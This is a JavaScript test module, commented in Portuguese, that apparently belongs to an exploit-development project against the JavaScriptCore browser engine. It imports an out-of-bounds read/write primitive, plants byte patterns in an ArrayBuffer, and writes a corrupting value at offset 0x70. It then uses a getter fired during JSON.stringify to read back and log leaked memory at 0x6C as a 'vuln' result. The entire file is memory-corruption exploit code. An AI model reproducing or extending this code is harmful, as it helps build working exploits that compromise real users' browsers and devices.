// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterFor0x6CAnalysisV3"; // Novo nome para esta versão
let getter_called_flag = false;
// current_test_results_for_subtest será usado para armazenar o resultado de cada sub-teste
// e será definido dentro do loop do runner.

const CORRUPTION_OFFSET_TRIGGER = 0x70; 
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const TARGET_WRITE_OFFSET_0x6C = 0x6C; 
const OOB_AB_GENERAL_FILL_PATTERN = 0xFEFEFEFE; // Padrão geral para preencher o resto
const SNOOP_AREA_FOR_0x6C_TEST = 0x100; // Área para preencher/sondar

const LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C = [
    0xCDCDCDCD, 
    0x12345678, 
    0x00000000,
    0xABABABAB,
    JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID || 2, // StructureID de AB
    0x00000200 // Um offset que usamos para metadados sombra em testes anteriores
];

// Variável global para o objeto que o Stringifier interno irá processar
let global_object_for_internal_stringify; 

class CheckpointFor0x6CAnalysisV3 {
    constructor(id) {
        this.id_marker = `Analyse0x6CV3Chkpt-${id}`;
        // Esta propriedade será usada pelo JSON.stringify externo.
        // O Stringifier interno no getter usará global_object_for_internal_stringify.
        this.prop_for_outer_stringify = "InitialData"; 
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "Analyse0x6CV3_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        // current_test_results_for_subtest é definido pelo runner antes desta chamada
        if (!current_test_results_for_subtest) {
            logS3("ERRO FATAL GETTER: current_test_results_for_subtest não definido!", "critical", FNAME_GETTER);
            return { "error_getter_no_results_obj": true};
        }
        current_test_results_for_subtest.message = "Getter chamado, analisando escrita do Stringifier em 0x6C.";
        let details_log_g = [];
        
        try {
            if (!oob_array_buffer_real || !oob_read_absolute || !oob_write_absolute) { // Adicionado oob_write_absolute
                throw new Error("Dependências OOB (oob_ab, read ou write) não disponíveis.");
            }
            
            // O JSON.stringify externo já está processando 'this'.
            // A escrita OOB em 0x70 já ocorreu, e o padrão inicial em 0x6C já foi plantado pelo runner.
            // A hipótese é que o Stringifier (da chamada externa) já fez a escrita anômala em 0x6C.
            // Vamos apenas LER o valor em 0x6C.

            logS3(`DENTRO DO GETTER: Lendo QWORD de oob_data[${toHex(TARGET_WRITE_OFFSET_0x6C)}]...`, "info", FNAME_GETTER);
            const value_at_0x6C_qword = oob_read_absolute(TARGET_WRITE_OFFSET_0x6C, 8);
            current_test_results_for_subtest.value_after_trigger_hex = value_at_0x6C_qword.toString(true);
            details_log_g.push(`Valor lido de oob_data[${toHex(TARGET_WRITE_OFFSET_0x6C)}] (QWORD): ${current_test_results_for_subtest.value_after_trigger_hex}`);
            logS3(details_log_g[details_log_g.length-1], "leak", FNAME_GETTER);

            // A análise e a decisão de sucesso serão feitas no runner,
            // que conhece o `initial_low_dword_planted`.
            // Apenas registramos o que foi lido.

            // Opcional: Chamar um JSON.stringify interno para ver se o estado do Stringifier muda mais alguma coisa,
            // ou se ele usa consistentemente o valor corrompido (se a corrupção afetar ponteiros que ele usa).
            if (global_object_for_internal_stringify) {
                logS3("DENTRO DO GETTER: Chamando JSON.stringify INTERNO (opcional)...", "info", FNAME_GETTER);
                try { JSON.stringify(global_object_for_internal_stringify); } catch (e_int_str) { details_log_g.push(`Erro stringify int: ${e_int_str.message}`);}
                details_log_g.push("Stringify interno (opcional) chamado.");
            }


        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results_for_subtest.error = String(e_getter_main);
            current_test_results_for_subtest.message = (current_test_results_for_subtest.message || "") + ` Erro no getter: ${e_getter_main.message}`;
        }
        current_test_results_for_subtest.details_getter = details_log_g.join('; ');
        return { "getter_0x6C_analysis_v3_complete": true };
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointFor0x6CAnalysisV3.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter
        return { 
            id: this.id_marker, 
            target_prop_val: this.prop_for_stringify, // Para o Stringifier externo processar
            processed_by_0x6c_v3_test: true 
        };
    }
}

// Variável para passar o resultado do sub-teste do getter para o runner
let current_test_results_for_subtest; 

export async function executeRetypeOOB_AB_Test() { 
    const FNAME_TEST_RUNNER = "execute0x6CAnalysisRunnerV3"; // Nome atualizado
    logS3(`--- Iniciando Teste de Análise da Escrita em 0x6C (v3) ---`, "test", FNAME_TEST_RUNNER);

    let overall_summary = [];

    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.JSCell || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID) { 
        logS3("Offsets Críticos Ausentes", "critical", FNAME_TEST_RUNNER); return;
    }

    for (const initial_low_dword_planted of LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C) {
        getter_called_flag = false; 
        current_test_results_for_subtest = {  // Objeto para este sub-teste
            success: false, 
            message: `Testando com padrão baixo ${toHex(initial_low_dword_planted)} em ${toHex(TARGET_WRITE_OFFSET_0x6C)}.`, 
            error: null, 
            pattern_planted_low_hex: toHex(initial_low_dword_planted),
            value_after_trigger_hex: null, 
            details_getter: ""
        };

        logS3(`INICIANDO SUB-TESTE: Padrão baixo em ${toHex(TARGET_WRITE_OFFSET_0x6C)} será ${toHex(initial_low_dword_planted)}`, "subtest", FNAME_TEST_RUNNER);

        try {
            await triggerOOB_primitive();
            if (!oob_array_buffer_real || !oob_dataview_real || !oob_write_absolute) { throw new Error("OOB Init falhou"); }
            logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
            
            // 1. Preencher a área de sondagem com um padrão geral
            const fill_limit = Math.min(SNOOP_AREA_FOR_0x6C_TEST, oob_array_buffer_real.byteLength);
            for (let offset = 0; offset < fill_limit; offset += 4) {
                if ((offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) ||
                    (offset >= TARGET_WRITE_OFFSET_0x6C && offset < TARGET_WRITE_OFFSET_0x6C + 8) ) { // Deixar 0x6C e 0x70 para escritas específicas
                    continue; 
                }
                try { oob_write_absolute(offset, OOB_AB_GENERAL_FILL_PATTERN, 4); } catch(e){}
            }
            // Escrever o padrão de teste específico nos 4 bytes baixos de 0x6C
            // E zerar os 4 bytes altos de 0x6C (que é o início de 0x70 se não houver padding)
            oob_write_absolute(TARGET_WRITE_OFFSET_0x6C, initial_low_dword_planted, 4);
            if (TARGET_WRITE_OFFSET_0x6C + 4 < CORRUPTION_OFFSET_TRIGGER) { // Só zera se não for sobrescrever o gatilho
                 oob_write_absolute(TARGET_WRITE_OFFSET_0x6C + 4, 0x00000000, 4); 
            }
            const initial_qword_at_0x6C = oob_read_absolute(TARGET_WRITE_OFFSET_0x6C, 8); // Ler o QWORD completo para log
            logS3(`oob_ab preenchido. oob_data[${toHex(TARGET_WRITE_OFFSET_0x6C)}] (QWORD inicial) = ${initial_qword_at_0x6C.toString(true)}.`, "info", FNAME_TEST_RUNNER);
            
            // 2. Objeto alvo para o getter (pode ser usado no stress_obj do getter)
            global_object_for_internal_stringify = { "unique_id": 0xC0FFEE00 + initial_low_dword_planted, "data":"GetterStressData"};

            // 3. Escrita OOB Gatilho em 0x70
            oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
            logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

            const checkpoint_obj = new CheckpointFor0x6CAnalysisV3(1);
            checkpoint_obj.prop_for_stringify_target = global_object_for_internal_stringify; // Passar um objeto para o toJSON
            logS3(`Checkpoint objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
            
            JSON.stringify(checkpoint_obj); // Aciona o getter

            // Análise do resultado do sub-teste (após o getter ter modificado current_test_results_for_subtest)
            if (getter_called_flag && current_test_results_for_subtest.value_after_trigger_hex) {
                const final_qword_val_obj = new AdvancedInt64(current_test_results_for_subtest.value_after_trigger_hex);
                if (final_qword_val_obj.high() === 0xFFFFFFFF && final_qword_val_obj.low() === initial_low_dword_planted) {
                    current_test_results_for_subtest.success = true;
                    current_test_results_for_subtest.message = `SUCESSO! 0x6C: Alto=FFFFFFFF, Baixo=${toHex(final_qword_val_obj.low())} (preservado).`;
                } else if (final_qword_val_obj.high() === 0xFFFFFFFF) {
                    current_test_results_for_subtest.success = true; // Ainda um sucesso, pois o alto foi escrito
                    current_test_results_for_subtest.message = `ANOMALIA! 0x6C: Alto=FFFFFFFF, Baixo=${toHex(final_qword_val_obj.low())} (ALTERADO de ${toHex(initial_low_dword_planted)}).`;
                } else {
                    current_test_results_for_subtest.message = `Valor em 0x6C (${final_qword_val_obj.toString(true)}) não teve Alto FFFFFFFF.`;
                }
            } else if (getter_called_flag) {
                 current_test_results_for_subtest.message = current_test_results_for_subtest.message || "Getter chamado, mas valor de 0x6C não foi corretamente registrado pelo getter.";
            }


        } catch (mainError_runner_subtest) { 
            current_test_results_for_subtest.message = `Erro CRÍTICO no sub-teste: ${mainError_runner_subtest.message}`;
            current_test_results_for_subtest.error = String(mainError_runner_subtest);
            logS3(current_test_results_for_subtest.message, "critical", FNAME_TEST_RUNNER);
        } finally {
            logS3(`FIM DO SUB-TESTE com padrão inicial ${toHex(initial_low_dword_planted)} em ${toHex(TARGET_WRITE_OFFSET_0x6C)}`, "subtest", FNAME_TEST_RUNNER);
            if (getter_called_flag) {
                logS3(`  Resultado Sub-Teste: Success=${current_test_results_for_subtest.success}, Msg=${current_test_results_for_subtest.message}`, current_test_results_for_subtest.success ? "vuln" : "warn", FNAME_TEST_RUNNER);
                if(current_test_results_for_subtest.value_after_trigger_hex) {
                     logS3(`    Valor final em ${toHex(TARGET_WRITE_OFFSET_0x6C)}: ${current_test_results_for_subtest.value_after_trigger_hex}`, "leak", FNAME_TEST_RUNNER);
                }
                 logS3(`    Detalhes do Getter: ${current_test_results_for_subtest.details_getter}`, "info", FNAME_TEST_RUNNER);
            } else {
                logS3(`  Resultado Sub-Teste: GETTER NÃO FOI CHAMADO. Msg: ${current_test_results_for_subtest.message}`, "error", FNAME_TEST_RUNNER);
            }
            overall_summary.push(JSON.parse(JSON.stringify(current_test_results_for_subtest))); 
            clearOOBEnvironment();
            global_object_for_internal_stringify = null;
            if (initial_low_dword_planted !== LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C[LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C.length -1]) {
                 await PAUSE_S3(100); 
            }
        }
    }

    logS3("==== SUMÁRIO GERAL DO TESTE DE ANÁLISE DA ESCRITA EM 0x6C (v3) ====", "test", FNAME_TEST_RUNNER);
    overall_summary.forEach(res_item => {
        logS3(`Padrão Plantado (Low DWORD em ${toHex(TARGET_WRITE_OFFSET_0x6C)}): ${res_item.pattern_planted_low_hex}`, "info", FNAME_TEST_RUNNER);
        const getter_was_called_for_item = res_item.message.includes("Getter chamado") || res_item.details_getter?.includes("Getter") || res_item.success || (res_item.error && res_item.error.includes("getter"));
        logS3(`  Getter Chamado: ${getter_was_called_for_item}`, "info", FNAME_TEST_RUNNER);
        logS3(`  Sucesso (Anomalia Útil em 0x6C): ${res_item.success}`, res_item.success ? "vuln" : "info", FNAME_TEST_RUNNER);
        logS3(`  Mensagem: ${res_item.message}`, "info", FNAME_TEST_RUNNER);
        if(res_item.value_after_trigger_hex){
            logS3(`    Valor Final Lido de ${toHex(TARGET_WRITE_OFFSET_0x6C)}: ${res_item.value_after_trigger_hex}`, "leak", FNAME_TEST_RUNNER);
        }
        if (res_item.details_getter) logS3(`    Detalhes Getter: ${res_item.details_getter}`, "info", FNAME_TEST_RUNNER);
        if (res_item.error) logS3(`  Erro: ${res_item.error}`, "error", FNAME_TEST_RUNNER);
        logS3("----------------------------------------------------", "info", FNAME_TEST_RUNNER);
    });

    logS3(`--- Teste de Análise da Escrita em 0x6C (v3) Concluído ---`, "test", FNAME_TEST_RUNNER);
}
